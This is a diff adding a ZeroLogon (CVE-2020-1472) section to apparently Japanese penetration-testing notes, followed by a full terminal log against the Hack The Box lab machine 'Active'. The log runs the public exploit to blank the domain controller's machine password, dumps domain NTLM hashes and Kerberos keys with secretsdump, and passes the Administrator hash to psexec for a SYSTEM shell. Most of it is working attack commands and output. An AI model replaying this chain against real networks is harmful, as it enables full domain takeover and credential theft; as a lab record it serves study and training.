@@ -142,4 +142,199 @@
   [*] Stage0: 0
   ```
   
+## ZeroLogon(CVE-2020-1472)
+* DCのコンピュータアカウント(ユーザアカウントにあらず)を0で初期化可能な脆弱性
+* コンピュータアカウントはAdministratorsグループに入っていないため、SMBの書き込み権限がなく、SMBを利用した横展開は困難
+* ただし、DCSyncの権限が通常与えられているため、ハッシュのリークが可能
+* [CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472)
+* Windows Server 2008 <= Windows Server 2019
+* Htb: Active
+
+  ```console
+  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
+  └──╼ $impacket-rpcdump @10.129.215.130 | grep -A 20 MS-NRPC
+  Protocol: [MS-NRPC]: Netlogon Remote Protocol
+  Provider: netlogon.dll
+  UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0
+  Bindings:
+            ncacn_ip_tcp:10.129.215.130[49158]
+            ncacn_http:10.129.215.130[49157]
+            ncalrpc:[NTDS_LPC]
+            ncalrpc:[OLE5C7E43F2E2CE45B897AAB4CA6A17]
+            ncacn_ip_tcp:10.129.215.130[49155]
+            ncalrpc:[samss lpc]
+            ncalrpc:[dsrole]
+            ncacn_np:\\DC[\PIPE\protected_storage]
+            ncalrpc:[protected_storage]
+            ncalrpc:[lsasspirpc]
+            ncalrpc:[lsapolicylookup]
+            ncalrpc:[LSARPC_ENDPOINT]
+            ncalrpc:[securityevent]
+            ncalrpc:[audit]
+            ncalrpc:[LRPC-f4a12c6cc949704079]
+            ncacn_np:\\DC[\pipe\lsass]
+  
+  ┌─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
+  └──╼ $ldapsearch -x -D svc_tgs@active.htb -w GPPstillStandingStrong2k18 -h 10.129.215.130 -b dc=active,dc=htb '(objectClass=computer)'
+  # extended LDIF
+  #
+  # LDAPv3
+  # base <dc=active,dc=htb> with scope subtree
+  # filter: (objectClass=computer)
+  # requesting: ALL
+  #
+  
+  # DC, Domain Controllers, active.htb
+  dn: CN=DC,OU=Domain Controllers,DC=active,DC=htb
+  objectClass: top
+  objectClass: person
+  objectClass: organizationalPerson
+  objectClass: user
+  objectClass: computer
+  cn: DC
+  distinguishedName: CN=DC,OU=Domain Controllers,DC=active,DC=htb
+  instanceType: 4
+  whenCreated: 20180718185035.0Z
+  whenChanged: 20210914044622.0Z
+  uSNCreated: 12293
+  uSNChanged: 98634
+  name: DC
+  objectGUID:: 8+IJCvv15EeIY91yEStv/Q==
+  userAccountControl: 532480
+  badPwdCount: 0
+  codePage: 0
+  countryCode: 0
+  badPasswordTime: 0
+  lastLogoff: 0
+  lastLogon: 132760683827783747
+  localPolicyFlags: 0
+  pwdLastSet: 132760683827783747
+  primaryGroupID: 516
+  objectSid:: AQUAAAAAAAUVAAAArxktGAS1AL49Gv126AMAAA==
+  accountExpires: 9223372036854775807
+  logonCount: 105
+  sAMAccountName: DC$
+  sAMAccountType: 805306369
+  operatingSystem: Windows Server 2008 R2 Standard
+  operatingSystemVersion: 6.1 (7601)
+  operatingSystemServicePack: Service Pack 1
+  serverReferenceBL: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Con
+   figuration,DC=active,DC=htb
+  dNSHostName: DC.active.htb
+  rIDSetReferences: CN=RID Set,CN=DC,OU=Domain Controllers,DC=active,DC=htb
+  servicePrincipalName: ldap/DC.active.htb/ForestDnsZones.active.htb
+  servicePrincipalName: ldap/DC.active.htb/DomainDnsZones.active.htb
+  servicePrincipalName: TERMSRV/DC
+  servicePrincipalName: TERMSRV/DC.active.htb
+  servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.active.htb
+  servicePrincipalName: DNS/DC.active.htb
+  servicePrincipalName: GC/DC.active.htb/active.htb
+  servicePrincipalName: RestrictedKrbHost/DC.active.htb
+  servicePrincipalName: RestrictedKrbHost/DC
+  servicePrincipalName: HOST/DC/ACTIVE
+  servicePrincipalName: HOST/DC.active.htb/ACTIVE
+  servicePrincipalName: HOST/DC
+  servicePrincipalName: HOST/DC.active.htb
+  servicePrincipalName: HOST/DC.active.htb/active.htb
+  servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/f4953ea5-0f30-4041-
+   b4dd-1a00693a8510/active.htb
+  servicePrincipalName: ldap/DC/ACTIVE
+  servicePrincipalName: ldap/f4953ea5-0f30-4041-b4dd-1a00693a8510._msdcs.active.
+   htb
+  servicePrincipalName: ldap/DC.active.htb/ACTIVE
+  servicePrincipalName: ldap/DC
+  servicePrincipalName: ldap/DC.active.htb
+  servicePrincipalName: ldap/DC.active.htb/active.htb
+  objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=active,DC=htb
+  isCriticalSystemObject: TRUE
+  dSCorePropagationData: 16010101000000.0Z
+  lastLogonTimestamp: 132760673060956836
+  msDS-SupportedEncryptionTypes: 31
+  msDFSR-ComputerReferenceBL: CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-
+   GlobalSettings,CN=System,DC=active,DC=htb
+  
+  # search reference
+  ref: ldap://ForestDnsZones.active.htb/DC=ForestDnsZones,DC=active,DC=htb
+  
+  # search reference
+  ref: ldap://DomainDnsZones.active.htb/DC=DomainDnsZones,DC=active,DC=htb
+  
+  # search reference
+  ref: ldap://active.htb/CN=Configuration,DC=active,DC=htb
+  
+  # search result
+  search: 2
+  result: 0 Success
+  
+  # numResponses: 5
+  # numEntries: 1
+  # numReferences: 3
+  
+  ┌─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
+  └──╼ $python3 cve-2020-1472-exploit.py 'DC$' 10.129.215.130
+  Performing authentication attempts...
+  ============================================================================================================================================================================================================================================================================================================================
+  Target vulnerable, changing account password to empty string
+  
+  Result: 0
+  
+  Exploit complete!
+  
+  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
+  └──╼ $impacket-psexec -no-pass 'DC$@10.129.215.130'
+  Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+  
+  [*] Requesting shares on 10.129.215.130.....
+  [-] share 'ADMIN$' is not writable.
+  [-] share 'C$' is not writable.
+  [-] share 'NETLOGON' is not writable.
+  [-] share 'Replication' is not writable.
+  [-] share 'SYSVOL' is not writable.
+  [-] share 'Users' is not writable.
+  
+  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
+  └──╼ $impacket-secretsdump -no-pass 'DC$@10.129.215.130'
+  Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+  
+  [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+  [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+  [*] Using the DRSUAPI method to get NTDS.DIT secrets
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
+  active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
+  DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  [*] Kerberos keys grabbed
+  Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
+  Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
+  Administrator:des-cbc-md5:5891549b31f2c294
+  krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
+  krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
+  krbtgt:des-cbc-md5:9d044f891adf7629
+  active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
+  active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
+  active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
+  DC$:aes256-cts-hmac-sha1-96:70c3ef13e7fd9897849898dc45abb6e7d21b7d6c5e1ca15d74bb690f7ca1f61e
+  DC$:aes128-cts-hmac-sha1-96:8e04da73d7b248b002d78b91c212201b
+  DC$:des-cbc-md5:235df1fd2afb3e5b
+  [*] Cleaning up...
+  
+  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
+  └──╼ $impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed Administrator@10.129.215.130
+  Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+  
+  [*] Requesting shares on 10.129.215.130.....
+  [*] Found writable share ADMIN$
+  [*] Uploading file yzhxKnwF.exe
+  [*] Opening SVCManager on 10.129.215.130.....
+  [*] Creating service IkcN on 10.129.215.130.....
+  [*] Starting service IkcN.....
+  [!] Press help for extra shell commands
+  Microsoft Windows [Version 6.1.7601]
+  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+  
+  C:\Windows\system32>whoami
+  nt authority\system
+  ```
+
   
